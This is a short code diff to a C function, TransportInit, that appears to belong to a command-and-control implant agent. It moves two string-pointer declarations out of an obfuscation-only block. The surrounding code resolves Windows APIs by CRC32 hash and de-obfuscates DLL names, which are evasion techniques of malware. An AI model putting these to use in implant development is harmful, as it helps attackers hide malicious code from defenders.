@@ -55,6 +55,8 @@ BOOL TransportInit( ) {
 
     // Add session id
     PackageAddInt32( Package, Instance.Session.AgentID );
+    PWCHAR pwcAdvapi32 = NULL;
+    PWCHAR pwcIphlpapi = NULL;
 
 #if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
@@ -85,8 +87,8 @@ BOOL TransportInit( ) {
     UNICODE_STRING usAdvapi32;
     UNICODE_STRING usIphlpapi;
 
-    PWCHAR pwcAdvapi32 = str_to_wide(d_advapi32);
-    PWCHAR pwcIphlpapi = str_to_wide(d_iphlpapi);
+    pwcAdvapi32 = str_to_wide(d_advapi32);
+    pwcIphlpapi = str_to_wide(d_iphlpapi);
 
     LdrLoadDll_t p_LdrLoadDll = GetProcAddressByHash(p_ntdll, LdrLoadDll_CRC32B);
     RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
@@ -272,8 +274,6 @@ BOOL TransportInit( ) {
     }
 
 #if CONFIG_OBFUSCATION == TRUE
-    PWCHAR pwcAdvapi32 = str_to_wide(d_advapi32);
-    PWCHAR pwcIphlpapi = str_to_wide(d_iphlpapi);
 
     if(pwcAdvapi32 != NULL){
         INT lenWAdvapi32 = lstrlenW(pwcAdvapi32);
